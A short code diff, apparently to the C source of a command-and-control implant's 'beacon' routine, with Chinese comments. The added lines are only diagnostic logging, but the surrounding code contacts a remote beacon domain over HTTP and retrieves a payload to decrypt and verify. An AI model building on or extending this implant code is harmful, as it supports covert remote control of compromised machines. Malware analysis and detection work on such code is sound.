@@ -264,9 +264,11 @@ void beacon(LPVOID lpReserved) {
 		/* 执行协议的HTTP部分 */
 		// dlog("beacon.beacon - http_init: %s \n", beacon_domain);
 		http_init(beacon_domain, port, ua);
+		bw_diag("post_init", (long)port);
 
 		// dlog("beacon.beacon - http_get: %s \n", url);
 		length = http_get(url, &bigsession, buffer, MAX_GET);
+		bw_diag("get_ret", length);
 
 		/* 这是在处理之前解密和验证有效载荷的适当时机 */
 		if (length > 0) {
